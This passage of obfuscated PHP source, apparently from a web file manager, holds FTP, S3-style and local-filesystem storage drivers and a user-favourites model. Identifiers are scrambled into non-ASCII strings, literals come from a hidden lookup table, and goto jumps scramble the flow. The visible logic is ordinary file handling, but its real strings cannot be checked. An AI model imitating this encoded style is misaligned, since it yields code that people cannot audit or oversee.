$—¸‹º Ñ - 1; curl_setopt($ÒôÛãÈ, CURLOPT_RANGE, "{$£ì•¨ñ°}\x2d{$–ÚäÖ“ï}"); } curl_setopt($ÒôÛãÈ, CURLOPT_RETURNTRANSFER, 1); $ˆã¿»Á² = curl_exec($ÒôÛãÈ); curl_close($ÒôÛãÈ); return $ˆã¿»Á²; } public function upload($¿Ïû€Õô, $ÜÏ©Ä«¾, $Şá‹Ùúó = false, $¥«×²¥¶ = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($¿Ïû€Õô))) { return !1; } $¿Ïû€Õô = $this->iconvSystem($¿Ïû€Õô); $ÜÏ©Ä«¾ = $this->iconvSystem($ÜÏ©Ä«¾); $õë¸Ìñã = ftp_nb_put($this->connect, $¿Ïû€Õô, $ÜÏ©Ä«¾, FTP_BINARY); while ($õë¸Ìñã == FTP_MOREDATA) { $õë¸Ìñã = ftp_nb_continue($this->connect); } if ($õë¸Ìñã != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[«òÑğ][1462], !0); return !1; } return $this->getPathOuter($¿Ïû€Õô); } public function download($ùÈ®û®, $ÉÈáÏÎç = '') { if (!$this->_isconn()) { return !1; } $ÈŠùÎ¬ = $this->pathFather($ÉÈáÏÎç); if (!IO::mkdir($ÈŠùÎ¬)) { return !1; } $ùÈ®û® = $this->iconvSystem($ùÈ®û®); $ÉÈáÏÎç = $this->iconvSystem($ÉÈáÏÎç); $  àüš’ = ftp_nb_get($this->connect, $ÉÈáÏÎç, $ùÈ®û®, FTP_BINARY); while ($  àüš’ == FTP_MOREDATA) { $  àüš’ = ftp_nb_continue($this->connect); } if ($  àüš’ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[«òÑğ][1462], !0); return !1; } return $this->iconvApp($ÉÈáÏÎç); } public function exist($¨İñìŸ¶) { return $this->isFile($¨İñìŸ¶) || $this->isFolder($¨İñìŸ¶); } public function isFile($ìõÜËù†) { return !$this->isFolder($ìõÜËù†) && $this->objectMeta($ìõÜËù†); } public function isFolder($ùşàÁøô) { return $this->cacheMethod($_SERVER[«òÑğ][180], $ùşàÁøô); } protected function objectMeta($±şôùÔ) { return $this->cacheMethod($_SERVER[«òÑğ][182], $±şôùÔ); } protected function _objectMeta($»ÇĞïËÌ) { $ö´²ìÇé =& $_SERVER[«òÑğ]; if ($»ÇĞïËÌ == $ö´²ìÇé[12] || $»ÇĞïËÌ == $ö´²ìÇé[8]) { return array(); } if (!$this->_isconn()) { return !1; } $»ÇĞïËÌ = $this->iconvSystem($»ÇĞïËÌ); $±ßÛŞıµ = array($ö´²ìÇé[32] => $this->iconvApp($»ÇĞïËÌ), $ö´²ìÇé[33] => $ö´²ìÇé[233], $ö´²ìÇé[79] => 0); $å­×¼‰ù = @ftp_size($this->connect, $»ÇĞïËÌ); if ($å­×¼‰ù != -1) { $±ßÛŞıµ[$ö´²ìÇé[79]] = $å­×¼‰ù; } else { $›Ø»€Éï = @ftp_chdir($this->connect, $»ÇĞïËÌ); if (!$›Ø»€Éï) { return !1; } @ftp_chdir($this->connect, $ö´²ìÇé[8]); $±ßÛŞıµ[$ö´²ìÇé[33]] = $ö´²ìÇé[78]; } return $±ßÛŞıµ; } protected function _isFolder($´Ç±œó°) { $ï‹©×‚ =& $_SERVER[«òÑğ]; if ($´Ç±œó° == $ï‹©×‚[12] || $´Ç±œó° == $ï‹©×‚[8]) { return !0; } $æôí¢›™ = $this->_objectMeta($´Ç±œó°); return isset($æôí¢›™[$ï‹©×‚[33]]) && $æôí¢›™[$ï‹©×‚[33]] == $ï‹©×‚[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($‹Ïªç’«) { parent::__construct($‹Ïªç’«); $this->setSignVersion($_SERVER[«òÑğ][250]); } public function uploadLink($Ğ¢ÓõÛ, $ÌÑ¥…ƒ’ = 0) { $÷‡øÔò€ =& $_SERVER[«òÑğ]; if ($this->isUploadServer()) { return; } $Áæş¹ˆ¦ = $this->getType(); if (!in_array($Áæş¹ˆ¦, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $îôÓÈ”Õ = (!$ÌÑ¥…ƒ’ ? 1 : ceil($ÌÑ¥…ƒ’ / pow(1024, 3))) * 3600 * 4; $Õ—ÏÑ = $this->uploadMultiData($Ğ¢ÓõÛ, $îôÓÈ”Õ); if ($Õ—ÏÑ) { $Õ—ÏÑ[$÷‡øÔò€[97]] = $Ğ¢ÓõÛ; $Õ—ÏÑ[$÷‡øÔò€[98]] = $Áæş¹ˆ¦; } return $Õ—ÏÑ; } public function fileOutImage($ªÛÇú¬è, $Ì¨–ÂÓˆ = 250) { if ($this->size($ªÛÇú¬è) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ªÛÇú¬è, $Ì¨–ÂÓˆ); } $”´Ûó½Ë = $this->link($ªÛÇú¬è); $”´Ûó½Ë .= $_SERVER[«òÑğ][1465] . $Ì¨–ÂÓˆ; $this->fileOutLink($”´Ûó½Ë); } public function fileOutLink($šòÈñá·) { $š¥ŠÎÊ˜ =& $_SERVER[«òÑğ]; if (substr($šòÈñá·, 0, 7) == $š¥ŠÎÊ˜[219]) { $šòÈñá· = $š¥ŠÎÊ˜[220] . substr($šòÈñá·, 7); } header($š¥ŠÎÊ˜[175] . $šòÈñá·); die; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($îÆëŸÈ¯) { if (substr($îÆëŸÈ¯, 0, 2) == $_SERVER[«òÑğ][1421]) { $îÆëŸÈ¯ = BASIC_PATH . substr($îÆëŸÈ¯, 2); } return $îÆëŸÈ¯; } public function iconvApp($Ë‡è»¹”) { $Ğ²ñ£ÑÂ =& $_SERVER[«òÑğ]; global $config; return $this->iconvTo($Ë‡è»¹”, $config[$Ğ²ñ£ÑÂ[1451]], $config[$Ğ²ñ£ÑÂ[1450]]); } public function iconvSystem($ìéÅñ¹°) { $ÚÔ²ì² =& $_SERVER[«òÑğ]; global $config; return $this->iconvTo($ìéÅñ¹°, $config[$ÚÔ²ì²[1450]], $config[$ÚÔ²ì²[1451]]); } public function getPathOuter($¢²Ö¡) { $ Ê«¹ôº =& $_SERVER[«òÑğ]; $‰üâîÁ = $this->iconvApp($this->pathBase); $¢²Ö¡ = $this->iconvApp($¢²Ö¡); if (substr($‰üâîÁ, 0, 2) == $ Ê«¹ôº[1421]) { $‰üâîÁ = BASIC_PATH . substr($‰üâîÁ, 2); } if (substr($¢²Ö¡, 0, 2) == $ Ê«¹ôº[1421]) { $¢²Ö¡ = BASIC_PATH . substr($¢²Ö¡, 2); } $‰üâîÁ = KodIO::clear($‰üâîÁ); $¢²Ö¡ = KodIO::clear($¢²Ö¡); $¢²Ö¡ = substr($¢²Ö¡, strlen($‰üâîÁ)); if (empty($this->pathDriver)) { return $¢²Ö¡; } return $this->pathDriver . $ Ê«¹ôº[8] . ltrim($¢²Ö¡, $ Ê«¹ôº[8]); } public function mkfile($¾ˆøÌ°», $¸‚èıµ¤ = '', $¢¹Şáì¥ = REPEAT_RENAME) { $¾ˆøÌ°» = $this->iconvSystem($¾ˆøÌ°»); @touch($¾ˆøÌ°»); if ($¸‚èıµ¤) { file_put_contents($¾ˆøÌ°», $¸‚èıµ¤); } @chmod($¾ˆøÌ°», $this->pathAuth); if (is_file($¾ˆøÌ°»)) { return $this->getPathOuter($¾ˆøÌ°»); } $this->writeLog(__FUNCTION__ . $_SERVER[«òÑğ][1462], !0); return !1; } public function mkdir($Á–Ôå­¼, $ÃòÖØ† = REPEAT_SKIP) { $Á–Ôå­¼ = $this->iconvSystem($Á–Ôå­¼); if (is_dir($Á–Ôå­¼)) { return $this->getPathOuter($Á–Ôå­¼); } @mkdir($Á–Ôå­¼, $this->pathAuth, !0); @chmod($Á–Ôå­¼, $this->pathAuth); if (is_dir($Á–Ôå­¼)) { return $this->getPathOuter($Á–Ôå­¼); } $this->writeLog(__FUNCTION__ . $_SERVER[«òÑğ][1462], !0); return !1; } public function copyFile($´÷ÜÙ¼, $×ùîËéæ) { $this->mkdir($this->pathFather($×ùîËéæ)); $´÷ÜÙ¼ = $this->iconvSystem($´÷ÜÙ¼); $×ùîËéæ = $this->iconvSystem($×ùîËéæ); $Îò¼©§‘ = copy_64($´÷ÜÙ¼, $×ùîËéæ); @chmod($×ùîËéæ, $this->pathAuth); if ($Îò¼©§‘) { return $this->getPathOuter($×ùîËéæ); } $this->writeLog(__FUNCTION__ . $_SERVER[«òÑğ][1462], !0); return !1; } public function moveFile($Ë‹™™šŠ, $üõ‚şèÃ) { $this->mkdir($this->pathFather($üõ‚şèÃ)); $Ë‹™™šŠ = $this->iconvSystem($Ë‹™™šŠ); $üõ‚şèÃ = $this->iconvSystem($üõ‚şèÃ); $÷Õƒãñû = intval(@rename($Ë‹™™šŠ, $üõ‚şèÃ)); if (!$÷Õƒãñû) { if ($÷Õƒãñû = intval(@copy_64($Ë‹™™šŠ, $üõ‚şèÃ))) { @unlink($Ë‹™™šŠ); } } @chmod($üõ‚şèÃ, $this->pathAuth); if ($÷Õƒãñû) { return $this->getPathOuter($üõ‚şèÃ); } $this->writeLog(__FUNCTION__ . $_SERVER[«òÑğ][1462], !0); return !1; } public function movePath($ÊÓ¡ß†â, $Ù™¦Çú“, $®ü„ˆ«ª = false) { $ê²û  =& $_SERVER[«òÑğ]; $ÊÓ¡ß†â = $this->iconvSystem($ÊÓ¡ß†â); $Ù™¦Çú“ = $this->iconvSystem($Ù™¦Çú“); $ã÷¶æšæ = rtrim($Ù™¦Çú“, $ê²û [8]) . $ê²û [8] . ($®ü„ˆ«ª ? $®ü„ˆ«ª : get_path_this($ÊÓ¡ß†â)); if (file_exists($ã÷¶æšæ)) { return !1; } $î­·öÈ = intval(@rename($ÊÓ¡ß†â, $ã÷¶æšæ)); $î­·öÈ = file_exists($ã÷¶æšæ); if ($î­·öÈ) { return $this->getPathOuter($ã÷¶æšæ); } $this->writeLog(__FUNCTION__ . $ê²û [1462], !0); return !1; } public function delFile($úš¿éÊİ) { $úš¿éÊİ = $this->iconvSystem($úš¿éÊİ); if (!@unlink($úš¿éÊİ)) { @chmod($úš¿éÊİ, $this->pathAuth); if (@unlink($úš¿éÊİ)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[«òÑğ][1462], !0); return !1; } return !0; } public function delFolder($ãÅÂå†á) { $«¸×ùÏÂ =& $_SERVER[«òÑğ]; $ãÅÂå†á = $this->iconvSystem($ãÅÂå†á); if (!is_dir($ãÅÂå†á)) { return !0; } if (!($ÏÜµØ×« = opendir($ãÅÂå†á))) { return !1; } while (($¼×Æ¿ß = readdir($ÏÜµØ×«)) !== !1) { if ($¼×Æ¿ß == $«¸×ùÏÂ[10] || $¼×Æ¿ß == $«¸×ùÏÂ[1373]) { continue; } $ã„´ú·Ş = $ãÅÂå†á . $«¸×ùÏÂ[8] . $¼×Æ¿ß; if (is_file($ã„´ú·Ş) || is_link($ã„´ú·Ş)) { if (!unlink($ã„´ú·Ş)) { chmod($ã„´ú·Ş, $this->pathAuth); if (!unlink($ã„´ú·Ş)) { return !1; } } } else { if (is_dir($ã„´ú·Ş)) { chmod($ã„´ú·Ş, $this->pathAuth); $ã„´ú·Ş = $this->iconvApp($ã„´ú·Ş); if (!$this->delFolder($ã„´ú·Ş)) { return !1; } } } } closedir($ÏÜµØ×«); return rmdir($ãÅÂå†á); } public function rename($µãê«š¶, $æ¦¥ˆ®œ) { $©Ãùè•é =& $_SERVER[«òÑğ]; $Ãë¸¢‘À = $this->fileNameAuto($this->pathFather($µãê«š¶), $æ¦¥ˆ®œ); $Ãë¸¢‘À = $this->iconvSystem($Ãë¸¢‘À); $µãê«š¶ = $this->iconvSystem($µãê«š¶); $à„öÅêò = $this->pathFather($µãê«š¶); $ÒÉ¶°êÂ = rtrim($à„öÅêò, $©Ãùè•é[8]) . $©Ãùè•é[8] . $Ãë¸¢‘À; $º·í´¼ = @rename($µãê«š¶, $ÒÉ¶°êÂ); $ÒÉ¶°êÂ = $this->iconvApp($ÒÉ¶°êÂ); if ($º·í´¼) { return $this->getPathOuter($ÒÉ¶°êÂ); } $this->writeLog(__FUNCTION__ . $©Ãùè•é[1462], !0); return !1; } public function size($ÕÄ²½ãà) { $ÕÄ²½ãà = $this->iconvSystem($ÕÄ²½ãà); return filesize_64($ÕÄ²½ãà); } public function info($Ô•à™©) { $Ô•à™© = $this->iconvSystem($Ô•à™©); if ($this->isFolder($Ô•à™©)) { return $this->folderInfo($Ô•à™©); } else { if ($this->isFile($Ô•à™©)) { return $this->fileInfo($Ô•à™©); } } return !1; } protected function infoChildren($£¬üÆ, &$À±–¹á„, $†„èëı• = true) { $Õ–Š·£Ğ =& $_SERVER[«òÑğ]; check_abort_echo(); $£¬üÆ = rtrim($£¬üÆ, $Õ–Š·£Ğ[8]) . $Õ–Š·£Ğ[8]; if ($†„èëı•) { $£¬üÆ = $this->iconvSystem($£¬üÆ); } if (!($ª©•êåÕ = @opendir($£¬üÆ))) { return; } while (($Ç£´—÷ = readdir($ª©•êåÕ)) !== !1) { if ($Ç£´—÷ == $Õ–Š·£Ğ[10] || $Ç£´—÷ == $Õ–Š·£Ğ[1373]) { continue; } $‘àÍ¤Ü = $£¬üÆ . $Ç£´—÷; if (is_file($‘àÍ¤Ü) || is_link($‘àÍ¤Ü)) { $À±–¹á„[$Õ–Š·£Ğ[80]]++; $À±–¹á„[$Õ–Š·£Ğ[79]] += filesize_64($‘àÍ¤Ü); } else { if (is_dir($‘àÍ¤Ü)) { $À±–¹á„[$Õ–Š·£Ğ[81]]++; $this->infoChildren($‘àÍ¤Ü, $À±–¹á„, !1); } } } closedir($ª©•êåÕ); } private function folderInfo($Ÿ´ĞÈêÖ, $Ä‚£–÷ = false) { $„”ë¶—² =& $_SERVER[«òÑğ]; $Ÿ´ĞÈêÖ = rtrim($Ÿ´ĞÈêÖ, $„”ë¶—²[8]) . $„”ë¶—²[8]; $°ø¦¦ÃÎ = $this->iconvApp($this->pathThis($Ÿ´ĞÈêÖ)); if ($Ä‚£–÷) { return array($„”ë¶—²[32] => $°ø¦¦ÃÎ, $„”ë¶—²[87] => $this->getPathOuter($Ÿ´ĞÈêÖ), $„”ë¶—²[33] => $„”ë¶—²[78]); } $½—‹ó¨æ = array($„”ë¶—²[32] => $°ø¦¦ÃÎ, $„”ë¶—²[87] => $this->getPathOuter($Ÿ´ĞÈêÖ), $„”ë¶—²[33] => $„”ë¶—²[78], $„”ë¶—²[234] => @filectime($Ÿ´ĞÈêÖ), $„”ë¶—²[88] => @filemtime($Ÿ´ĞÈêÖ), $„”ë¶—²[1466] => @fileatime($Ÿ´ĞÈêÖ), $„”ë¶—²[1467] => is_readable($Ÿ´ĞÈêÖ), $„”ë¶—²[1468] => is_writable($Ÿ´ĞÈêÖ), $„”ë¶—²[1469] => get_mode($Ÿ´ĞÈêÖ)); return $½—‹ó¨æ; } private function fileInfo($©òÃ’Í­, $éÔ£ÊÏï = false) { $“´„É×ä =& $_SERVER[«òÑğ]; $ˆ¿ºÓš… = $this->iconvApp($this->pathThis($©òÃ’Í­)); if ($éÔ£ÊÏï) { return array($“´„É×ä[32] => $ˆ¿ºÓš…, $“´„É×ä[87] => $this->getPathOuter($©òÃ’Í­), $“´„É×ä[33] => $“´„É×ä[233], $“´„É×ä[79] => $this->size($©òÃ’Í­), $“´„É×ä[169] => $this->ext($ˆ¿ºÓš…)); } $ñµ‰«È• = array($“´„É×ä[32] => $ˆ¿ºÓš…, $“´„É×ä[87] => $this->getPathOuter($©òÃ’Í­), $“´„É×ä[33] => $“´„É×ä[233], $“´„É×ä[234] => @filectime($©òÃ’Í­), $“´„É×ä[88] => @filemtime($©òÃ’Í­), $“´„É×ä[1466] => @fileatime($©òÃ’Í­), $“´„É×ä[79] => $this->size($©òÃ’Í­), $“´„É×ä[169] => $this->ext($ˆ¿ºÓš…), $“´„É×ä[1467] => is_readable($©òÃ’Í­), $“´„É×ä[1468] => is_writable($©òÃ’Í­), $“´„É×ä[1469] => get_mode($©òÃ’Í­)); return $ñµ‰«È•; } public function exist($ÓÒÛƒö¿) { $ÓÒÛƒö¿ = $this->iconvSystem($ÓÒÛƒö¿); return @file_exists($ÓÒÛƒö¿); } public function isFile($¾œ£à›ï) { $¾œ£à›ï = $this->iconvSystem($¾œ£à›ï); return @is_file($¾œ£à›ï); } public function isFolder($ÛöñüÒæ) { $ÛöñüÒæ = $this->iconvSystem($ÛöñüÒæ); return @is_dir($ÛöñüÒæ); } public function listPath($®ŒóÅÊ˜, $“ƒòŸ“™ = false) { $å¡”°Ù— =& $_SERVER[«òÑğ]; $®ŒóÅÊ˜ = $this->iconvSystem($®ŒóÅÊ˜); $®ŒóÅÊ˜ = rtrim($®ŒóÅÊ˜, $å¡”°Ù—[8]) . $å¡”°Ù—[8]; $ÕÊ˜Ïåô = array($å¡”°Ù—[85] => array(), $å¡”°Ù—[86] => array()); if (!($ÏùŠò© = @opendir($®ŒóÅÊ˜))) { return $ÕÊ˜Ïåô; } while (($ÒÑÅÊ³ê = readdir($ÏùŠò©)) !== !1) { if ($ÒÑÅÊ³ê == $å¡”°Ù—[10] || $ÒÑÅÊ³ê == $å¡”°Ù—[1373]) { continue; } $Ø°ãƒÃ• = $®ŒóÅÊ˜ . $ÒÑÅÊ³ê; if (is_file($Ø°ãƒÃ•)) { $ÕÊ˜Ïåô[$å¡”°Ù—[86]][] = $this->fileInfo($Ø°ãƒÃ•, $“ƒòŸ“™); } else { $ÕÊ˜Ïåô[$å¡”°Ù—[85]][] = $this->folderInfo($Ø°ãƒÃ•, $“ƒòŸ“™); } } closedir($ÏùŠò©); return $ÕÊ˜Ïåô; } public function listAll($İ¸Š©‘, &$›”¼şœ° = array()) { $¢ÚÂéˆ· =& $_SERVER[«òÑğ]; $İ¸Š©‘ = $this->iconvSystem($İ¸Š©‘); $İ¸Š©‘ = rtrim($İ¸Š©‘, $¢ÚÂéˆ·[8]) . $¢ÚÂéˆ·[8]; if (!($‘ÜˆÁà = @opendir($İ¸Š©‘))) { return $›”¼şœ°; } while (($¬¤·¹ô = readdir($‘ÜˆÁà)) !== !1) { if ($¬¤·¹ô == $¢ÚÂéˆ·[10] || $¬¤·¹ô == $¢ÚÂéˆ·[1373]) { continue; } $ûÄ•šÃ = $İ¸Š©‘ . $¬¤·¹ô; $ØÆôÔº× = is_dir($ûÄ•šÃ) && !is_link($ûÄ•šÃ) ? 1 : 0; $ûÄ•šÃ = $ØÆôÔº× ? $ûÄ•šÃ . $¢ÚÂéˆ·[8] : $ûÄ•šÃ; $›”¼şœ°[] = array($¢ÚÂéˆ·[87] => $this->getPathOuter($ûÄ•šÃ), $¢ÚÂéˆ·[78] => $ØÆôÔº×, $¢ÚÂéˆ·[88] => intval(@filemtime($ûÄ•šÃ)), $¢ÚÂéˆ·[79] => $ØÆôÔº× ? 0 : intval($this->size($ûÄ•šÃ))); if ($ØÆôÔº×) { $this->listAll($ûÄ•šÃ, $›”¼şœ°); } } closedir($‘ÜˆÁà); return $›”¼şœ°; } public function has($¾—ÌŠŠ‡, $½™ğÅªª = false, $‘ÂÎ±È = true) { $¯İÛ‘Ëº =& $_SERVER[«òÑğ]; $¾—ÌŠŠ‡ = $this->iconvSystem($¾—ÌŠŠ‡); $¾—ÌŠŠ‡ = rtrim($¾—ÌŠŠ‡, $¯İÛ‘Ëº[8]) . $¯İÛ‘Ëº[8]; if (!($Ì§ñıäé = @opendir($¾—ÌŠŠ‡))) { return !1; } $ÓáúÂª = 0; $ÒÀê™àÈ = 0; $¿õíÊµ… = 0; while (($öåìœµ“ = readdir($Ì§ñıäé)) !== !1) { if ($öåìœµ“ == $¯İÛ‘Ëº[10] || $öåìœµ“ == $¯İÛ‘Ëº[1373]) { continue; } $öÑÇÕİñ = $¾—ÌŠŠ‡ . $öåìœµ“; if ($½™ğÅªª) { $¿õíÊµ…++; if (@is_file($öÑÇÕİñ)) { $ÓáúÂª++; } else { $ÒÀê™àÈ++; } if ($¿õíÊµ… > 10000) { break; } continue; } if ($‘ÂÎ±È) { if (@is_file($öÑÇÕİñ)) { return !0; } } else { if (@is_dir($öÑÇÕİñ . $¯İÛ‘Ëº[8])) { return !0; } } } closedir($Ì§ñıäé); if ($½™ğÅªª) { return array($¯İÛ‘Ëº[242] => $ÓáúÂª, $¯İÛ‘Ëº[243] => $ÒÀê™àÈ); } return !1; } public function hashSimple($ö©Î©×ô) { $¢ÌØ‘¯Ğ =& $_SERVER[«òÑğ]; if (!$ö©Î©×ô) { return md5($¢ÌØ‘¯Ğ[12]); } $ö©Î©×ô = $this->iconvSystem($ö©Î©×ô); $ÜŞŞµšÒ = $this->size($ö©Î©×ô); $ÆÑ§ú = 200; $¨«¬ªİ« = 50; if ($ÜŞŞµšÒ <= $ÆÑ§ú * $¨«¬ªİ«) { return $this->hashMd5($ö©Î©×ô) . $ÜŞŞµšÒ; } $¥ŞÜıµ¥ = $¢ÌØ‘¯Ğ[12]; $ï•–¸¶ = intval($ÜŞŞµšÒ / $¨«¬ªİ«); $İ¢Œ¶ıˆ = fopen($ö©Î©×ô, $¢ÌØ‘¯Ğ[1470]); if (!$İ¢Œ¶ıˆ) { return $¥ŞÜıµ¥; } for ($Á©åË¹€ = 0; $Á©åË¹€ < $¨«¬ªİ«; $Á©åË¹€++) { fseek_64($İ¢Œ¶ıˆ, $ï•–¸¶ * $Á©åË¹€); $¥ŞÜıµ¥ .= fread($İ¢Œ¶ıˆ, $ÆÑ§ú); } fseek_64($İ¢Œ¶ıˆ, $ÜŞŞµšÒ - $ÆÑ§ú); $¥ŞÜıµ¥ .= fread($İ¢Œ¶ıˆ, $ÆÑ§ú); fclose($İ¢Œ¶ıˆ); return md5($¥ŞÜıµ¥) . $ÜŞŞµšÒ; } public function getContent($Á¼£‘­) { $Á¼£‘­ = $this->iconvSystem($Á¼£‘­); return file_get_contents($Á¼£‘­); } public function setContent($Äö¡è¾, $äÅ®“ò = '') { $Äö¡è¾ = $this->iconvSystem($Äö¡è¾); $®ïä÷Ğ¿ = @file_put_contents($Äö¡è¾, $äÅ®“ò, LOCK_EX); if (!$®ïä÷Ğ¿) { $this->writeLog(__FUNCTION__ . $_SERVER[«òÑğ][1462], !0); } clearstatcache(); @chmod($Äö¡è¾, $this->pathAuth); return $®ïä÷Ğ¿ === !1 ? !1 : !0; } public function fileSubstr($ùª›è€’, $—¡¸ˆÒá = 0, $şÆˆºŠò = false) { $‘ÜÌ£¯À =& $_SERVER[«òÑğ]; $ùª›è€’ = $this->iconvSystem($ùª›è€’); if ($şÆˆºŠò === !1) { $şÆˆºŠò = $this->size($ùª›è€’); } if ($şÆˆºŠò <= 0) { return $‘ÜÌ£¯À[12]; } $ÎÚ„¼’¡ = fopen($ùª›è€’, $‘ÜÌ£¯À[1470]); if (!$ÎÚ„¼’¡) { return !1; } fseek_64($ÎÚ„¼’¡, $—¡¸ˆÒá); $è§ŒœØ‡ = fread($ÎÚ„¼’¡, $şÆˆºŠò); fclose($ÎÚ„¼’¡); if (!$è§ŒœØ‡) { $this->writeLog(__FUNCTION__ . $‘ÜÌ£¯À[1462], !0); } return $è§ŒœØ‡; } public function upload($Ğª‰œÕ, $ÁÂ£®¹, $×Ğ°¿È½ = false, $ŸÙå¿·É = REPEAT_REPLACE) { if ($×Ğ°¿È½) { return $this->moveFile($ÁÂ£®¹, $Ğª‰œÕ); } return $this->copyFile($ÁÂ£®¹, $Ğª‰œÕ); } public function setModifyTime($â£œ­ä”, $ÀĞş‰èê = '') { @touch($â£œ­ä”, intval($ÀĞş‰èê)); } public function download($…‡ò’˜, $¨Ğ¼¨äò) { return $this->iconvSystem($…‡ò’˜); } } goto CÊÆªÛæ¼Î; cÃÕÉœİØ: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\137\x66\141\166"; protected function cacheFunctionAlias($——Ó‘Í§) { $Îû†–ñä =& $_SERVER[«òÑğ]; return array($Îû†–ñä[2100] => array(USER_ID, $Îû†–ñä[2477])); } protected function listData() { $»Şóªò =& $_SERVER[«òÑğ]; $”æØóò¨ = array($»Şóªò[1775] => USER_ID, $»Şóªò[562] => 0); $ÎÓóÎö­ = $»Şóªò[2478]; $üãŸÄâ = $this->field($ÎÓóÎö­)->where($”æØóò¨)->order($»Şóªò[2479])->select(); return $üãŸÄâ ? $üãŸÄâ : array(); } protected function resetCache() { } protected function listView() { $¯‡†œ¨ä =& $_SERVER[«òÑğ]; $Ö„€ùõ = $this->listData(); $ÍÑËÒãã = array_filter_by_field($Ö„€ùõ, $¯‡†œ¨ä[33], $¯‡†œ¨ä[493]); $ë—ƒÕƒÏ = array_to_keyvalue($ÍÑËÒãã, $¯‡†œ¨ä[12], $¯‡†œ¨ä[87]); if (!$ë—ƒÕƒÏ) { return $Ö„€ùõ; } $ÕÎúè©§ = 2000; $á¿Ş“û = array($¯‡†œ¨ä[494] => array($¯‡†œ¨ä[495], $ë—ƒÕƒÏ)); $İÍ¶ œ‹ = Model($¯‡†œ¨ä[914])->listSource($á¿Ş“û, $ÕÎúè©§); $İÍ¶ œ‹ = array_merge($İÍ¶ œ‹[$¯‡†œ¨ä[86]], $İÍ¶ œ‹[$¯‡†œ¨ä[85]]); $İÍ¶ œ‹ = array_to_keyvalue($İÍ¶ œ‹, $¯‡†œ¨ä[194]); foreach ($Ö„€ùõ as $ª‰÷µÏ­ => $°²‘£ñä) { $´äÖñ¶‡ = $İÍ¶ œ‹[$°²‘£ñä[$¯‡†œ¨ä[87]]]; $´äÖñ¶‡ = $´äÖñ¶‡ ? $´äÖñ¶‡ : array(); $Ö„€ùõ[$ª‰÷µÏ­] = array_merge($´äÖñ¶‡, $°²‘£ñä); } return $Ö„€ùõ; } protected function addFav($üÊ¡äƒ, $‡£›Ç³ = '', $¿À²©„· = "\x73\x6f\165\162\x63\145") { $ƒÙš×™¡ =& $_SERVER[«òÑğ]; $â³„À³Ş = array($ƒÙš×™¡[1775] => USER_ID, $ƒÙš×™¡[562] => 0, $ƒÙš×™¡[499] => $¿À²©„·, $ƒÙš×™¡[498] => $üÊ¡äƒ); if ($this->where($â³„À³Ş)->find()) { return !1; } $â³„À³Ş = array($ƒÙš×™¡[1775] => USER_ID, $ƒÙš×™¡[562] => 0); $‹Ä¨Å™‰ = $this->where($â³„À³Ş)->max($ƒÙš×™¡[2009]); if (!$‹Ä¨Å™‰) { $‹Ä¨Å™‰ = 0; } if (!$‡£›Ç³ && $¿À²©„· == $ƒÙš×™¡[493]) { $¿Ë¹Ì«¦ = Model($ƒÙš×™¡[1431])->where(array($ƒÙš×™¡[494] => $üÊ¡äƒ))->find(); if (!$¿Ë¹Ì«¦) { return !1; } $‡£›Ç³ = $¿Ë¹Ì«¦[$ƒÙš×™¡[32]]; } $‡£›Ç³ = $this->getAutoName($‡£›Ç³); $Á·©ëœÁ = array($ƒÙš×™¡[1775] => USER_ID, $ƒÙš×™¡[562] => 0, $ƒÙš×™¡[497] => $‡£›Ç³, $ƒÙš×™¡[498] => $üÊ¡äƒ, $ƒÙš×™¡[499] => $¿À²©„·, $ƒÙš×™¡[1989] => $‹Ä¨Å™‰ + 1); return $this->add($Á·©ëœÁ); } protected function remove($Ô»‘«²“) { $ÄüÛ£ëŒ =& $_SERVER[«òÑğ]; $éÀºüÛ¾ = array($ÄüÛ£ëŒ[1775] => USER_ID, $ÄüÛ£ëŒ[496] => $Ô»‘«²“); return $this->where($éÀºüÛ¾)->delete(); } protected function removeByName($•º¤å™) { $¯¯ÔşŞ =& $_SERVER[«òÑğ]; $àÛ­ı­› = array($¯¯ÔşŞ[1775] => USER_ID, $¯¯ÔşŞ[497] => $•º¤å™, $¯¯ÔşŞ[562] => 0); return $this->where($àÛ­ı­›)->delete(); } protected function rename($ŞŒ»¬«Ö, $ØÎÚª¢”) { $ÁüŠşªÚ =& $_SERVER[«òÑğ]; if ($ŞŒ»¬«Ö == $ØÎÚª¢”) { return !1; } $µ—İ×² = $this->getAutoName($ØÎÚª¢”); if ($ØÎÚª¢” != $µ—İ×²) { return !1; } $í »‚Š” = array($ÁüŠşªÚ[1775] => USER_ID, $ÁüŠşªÚ[562] => 0, $ÁüŠşªÚ[32] => $ŞŒ»¬«Ö); return $this->where($í »‚Š”)->save(array($ÁüŠşªÚ[32] => $ØÎÚª¢”)); } protected function resetSort($êúÖáÄ§) { $»±ÂÌèŸ =& $_SERVER[«òÑğ]; $êúÖáÄ§ = is_array($êúÖáÄ§) ? $êúÖáÄ§ : array(); $—ù×§Ü = array($»±ÂÌèŸ[1775] => USER_ID); for ($…Íš×µ = 0; $…Íš×µ < count($êúÖáÄ§); $…Íš×µ++) { $—ù×§Ü[$»±ÂÌèŸ[496]] = $êúÖáÄ§[$…Íš×µ]; $this->where($—ù×§Ü)->save(array($»±ÂÌèŸ[1989] => $…Íš×µ + 1)); } return !0; } protected function moveTop($Ë¸Ïõ˜) { $“¾†šÆë =& $_SERVER[«òÑğ]; $¬£ú¶ = array($“¾†šÆë[1775] => USER_ID, $“¾†šÆë[562] => 0); $òËË¶ = $this->where($¬£ú¶)->where(array($“¾†šÆë[32] => $Ë¸Ïõ˜))->find(); if (!$òËË¶) { return; } $Ğ©ç’ãú = $this->field($“¾†šÆë[478])->where($¬£ú¶)->order($“¾†šÆë[2479])->select(); $Ğ©ç’ãú = array_to_keyvalue($Ğ©ç’ãú, $“¾†šÆë[12], $“¾†šÆë[478]); $¬Å™‘‰ñ = $Ğ©ç’ãú; $Ğ©ç’ãú = array_remove_value($Ğ©ç’ãú, $òËË¶[$“¾†šÆë[478]]); 